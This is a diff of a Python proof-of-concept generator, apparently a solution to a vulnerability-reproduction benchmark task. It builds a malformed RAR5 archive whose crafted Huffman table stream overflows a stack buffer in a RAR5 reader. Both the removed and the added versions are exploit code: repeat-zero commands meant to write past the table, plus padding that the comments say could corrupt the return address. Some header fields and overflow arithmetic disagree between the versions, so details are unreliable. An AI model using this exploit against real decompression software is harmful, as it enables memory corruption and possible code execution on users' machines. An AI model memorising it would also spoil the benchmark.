@@ -1,134 +1,136 @@
 import zlib
 import struct
 
-class Solution:
-    """
-    Generates a PoC for a stack buffer overflow in a RAR5 reader's
-    Huffman table parsing logic.
-    """
+class RarBitStream:
+    def __init__(self):
+        self.buf = bytearray()
+        self.current_byte = 0
+        self.bit_count = 0
 
+    def write_bits(self, val: int, n_bits: int):
+        for _ in range(n_bits):
+            bit = val & 1
+            val >>= 1
+            self.current_byte |= bit << self.bit_count
+            self.bit_count += 1
+            if self.bit_count == 8:
+                self.buf.append(self.current_byte)
+                self.current_byte = 0
+                self.bit_count = 0
+
+    def get_bytes(self) -> bytes:
+        if self.bit_count > 0:
+            self.buf.append(self.current_byte)
+        return bytes(self.buf)
+
+def write_vint(n: int) -> bytes:
+    res = bytearray()
+    while True:
+        byte = n & 0x7f
+        n >>= 7
+        if n == 0:
+            res.append(byte)
+            break
+        res.append(byte | 0x80)
+    return bytes(res)
+
+class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generates a malicious RAR5 archive.
-
-        The vulnerability is a stack buffer overflow when uncompressing Huffman
-        tables. The tables are compressed with an RLE-like scheme. By crafting
-        a stream with a repeat command (symbol 18) near the end of the
-        table buffer, we can cause the decoder to write past the buffer's bounds.
-
-        The PoC constructs a minimal RAR5 file with a single compressed file.
-        The compressed data for this file contains a specially crafted Huffman
-        table description that triggers the overflow.
+        Generate a PoC that triggers the vulnerability.
 
         Args:
-            src_path: Path to the vulnerable source code (unused).
+            src_path: Path to the vulnerable source code tarball
 
         Returns:
-            A bytes object representing the malicious RAR5 file.
+            bytes: The PoC input that should trigger the vulnerability
         """
         
-        def vint(n: int) -> bytes:
-            """Encodes an integer into the RAR5 variable-length integer format."""
-            if n == 0:
-                return b'\x00'
-            res = bytearray()
-            while n > 0:
-                b = n & 0x7f
-                n >>= 7
-                if n > 0:
-                    b |= 0x80
-                res.append(b)
-            return bytes(res)
+        # This PoC exploits a stack buffer overflow in the parsing of RLE-compressed
+        # Huffman tables within a RAR5 archive.
+        
+        # 1. Construct the malicious bitstream for the Huffman tables.
+        bs = RarBitStream()
+        
+        # A compressed data block in RAR5 can start with filter definitions.
+        # We disable filters by writing a '0' bit.
+        bs.write_bits(0, 1)
 
-        def crc32(data: bytes) -> bytes:
-            """Calculates CRC32 and returns it as little-endian bytes."""
-            return struct.pack('<I', zlib.crc32(data) & 0xffffffff)
+        # The vulnerability is triggered by writing more symbols to the Huffman
+        # code length table than its stack-allocated buffer can hold (~361 bytes).
+        # A special sequence in the bitstream (len=15, sub_cmd=2) instructs the
+        # parser to repeat the value zero. The repeat count is derived from the
+        # next 8 bits. With 8 bits set to 1 (255), the total repeat count is 274.
+        # By issuing this command twice, we attempt to write 548 zeros, which
+        # overflows the buffer.
+        
+        # First "repeat zero" command (writes 274 zeros)
+        bs.write_bits(15, 4)  # Escape code
+        bs.write_bits(2, 2)   # Sub-command for repeating zeros
+        bs.write_bits(255, 8) # Repeat count bits (yields 274 repeats)
 
-        # 1. RAR5 Signature
-        poc = bytearray(b'\x52\x61\x72\x21\x1a\x07\x01\x00')
+        # Second "repeat zero" command (this one triggers the overflow)
+        bs.write_bits(15, 4)  # Escape code
+        bs.write_bits(2, 2)   # Sub-command
+        bs.write_bits(255, 8) # Repeat count bits
 
-        # 2. Main Archive Header (type=2)
-        # We set the SOLID flag as the vulnerability might be in a code path
-        # for solid archives.
-        main_hdr_flags = 2  # Solid archive
-        main_hdr_data = vint(2) + vint(main_hdr_flags)
-        main_hdr_size_vint = vint(len(main_hdr_data))
-        main_hdr_for_crc = main_hdr_size_vint + main_hdr_data
-        poc.extend(crc32(main_hdr_for_crc) + main_hdr_for_crc)
+        # Provide minimal valid data for subsequent tables to ensure parsing continues.
+        bs.write_bits(0, 4) # A single code length for the distance table.
+        bs.write_bits(0, 4) # A single code length for the aligned distance table.
 
-        # 3. File Header (type=3)
-        # The compressed data size is constant for this PoC.
-        # 1 (filters) + 10 (BC table) + 52 (main table stream)
-        data_size = 63
+        malicious_bitstream = bs.get_bytes()
         
-        # Calculate header and block sizes. A simple calculation is sufficient
-        # as sizes are small and vints will be single-byte.
-        # Fields: type, hdr_flags, block_size, file_flags, unpack_size, attrib,
-        #         crc, comp_info, os, name
-        header_size_val = 1 + 1 + 1 + 1 + 1 + 1 + 4 + 1 + 1 + (1 + 1)
-        block_size_val = header_size_val + data_size
-        
-        v_header_size = vint(header_size_val)
-        v_block_size = vint(block_size_val)
-        
-        file_hdr_fields = b"".join([
-            vint(3),           # Type=3
-            vint(1),           # Header Flags (data present)
-            v_block_size,      # Block Size
-            vint(0x20),        # File Flags (solid file)
-            vint(0),           # Unpacked Size
-            vint(0x20),        # Attributes
-            b'\x00\x00\x00\x00', # File CRC32 (placeholder)
-            vint(0x28),        # Compression Info (method 5, 64k dict)
-            vint(2),           # Host OS (Windows)
-            vint(1) + b'a'     # File Name ('a')
-        ])
-        
-        file_hdr_for_crc = v_header_size + file_hdr_fields
-        poc.extend(crc32(file_hdr_for_crc) + file_hdr_for_crc)
-        
-        # 4. Compressed Data Block (The Payload)
-        data = bytearray()
-        
-        # No filters
-        data.append(0)
-        
-        # BC table bit lengths (Huffman table for other Huffman tables)
-        # We define a simple table:
-        # - Symbol 0 gets code length 1 (Huffman code '0')
-        # - Symbol 18 gets code length 1 (Huffman code '1')
-        # Symbol 18 is a command to repeat zeros.
-        data.extend(b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01')
-        
-        # Main Huffman table stream, decoded using the BC table.
-        # The target buffer size is 404.
-        # We write 403 zeros using BC symbol 0 (code '0').
-        # Then we issue command 18 (code '1') to repeat zeros 42 times.
-        # This writes from index 403 to 444, overflowing the buffer.
-        # Bitstream: 403 '0's + '1' + 5 '1's (for repeat count) = 409 bits.
-        
-        # 403 bits = 50 bytes and 3 bits.
-        stream = bytearray(b'\x00' * 50)
-        
-        # Next byte (LSB first bit order):
-        # bit 0-2: three '0's (end of 403 zero run)
-        # bit 3:   '1' (code for symbol 18)
-        # bit 4-7: four '1's (first 4 bits of repeat count 31)
-        # byte = 11111000b = 0xF8
-        stream.append(0xF8)
-        
-        # Last byte:
-        # bit 0: '1' (last bit of repeat count 31)
-        # byte = 00000001b = 0x01
-        stream.append(0x01)
-        data.extend(stream)
+        # 2. Pad the payload to match the ground-truth size.
+        # The padding may be necessary to control the stack layout and ensure
+        # the overflow corrupts a critical value like the return address.
+        payload_size = 480
+        padding = b'\x00' * (payload_size - len(malicious_bitstream))
+        payload = malicious_bitstream + padding
+        pack_size = len(payload)
 
-        poc.extend(data)
+        # 3. Assemble the full RAR5 file structure.
+        poc = b'Rar!\x1a\x07\x01\x00'
 
-        # 5. End of Archive Header (type=5)
-        end_hdr_data = vint(5) + vint(0)  # Type=5, Flags=0
-        end_hdr_size_vint = vint(len(end_hdr_data))
-        end_hdr_for_crc = end_hdr_size_vint + end_hdr_data
-        poc.extend(crc32(end_hdr_for_crc) + end_hdr_for_crc)
+        # Main Archive Header
+        main_header_data = write_vint(1) + write_vint(0) + write_vint(0) + write_vint(0)
+        main_header_size = write_vint(len(main_header_data))
+        main_header_crc = zlib.crc32(main_header_size + main_header_data)
+        poc += struct.pack('<I', main_header_crc)
+        poc += main_header_size
+        poc += main_header_data
         
-        return bytes(poc)
+        # File Header (containing the malicious payload)
+        unpack_size = 1024
+        file_attrs = 0x20
+        comp_info = 0x50  # Method=5 (RAR5 default), Dictionary=64KB
+        filename = b'a'
+        
+        file_header_data = (
+            write_vint(2) +
+            write_vint(0) +
+            write_vint(pack_size) +
+            write_vint(unpack_size) +
+            write_vint(file_attrs) +
+            write_vint(0) +
+            struct.pack('<I', 0) +
+            write_vint(comp_info) +
+            write_vint(len(filename)) +
+            filename
+        )
+        file_header_size = write_vint(len(file_header_data))
+        file_header_crc = zlib.crc32(file_header_size + file_header_data)
+        poc += struct.pack('<I', file_header_crc)
+        poc += file_header_size
+        poc += file_header_data
+
+        poc += payload
+        
+        # End of Archive Header
+        end_header_data = write_vint(5) + write_vint(0)
+        end_header_size = write_vint(len(end_header_data))
+        end_header_crc = zlib.crc32(end_header_size + end_header_data)
+        poc += struct.pack('<I', end_header_crc)
+        poc += end_header_size
+        poc += end_header_data
+
+        return poc
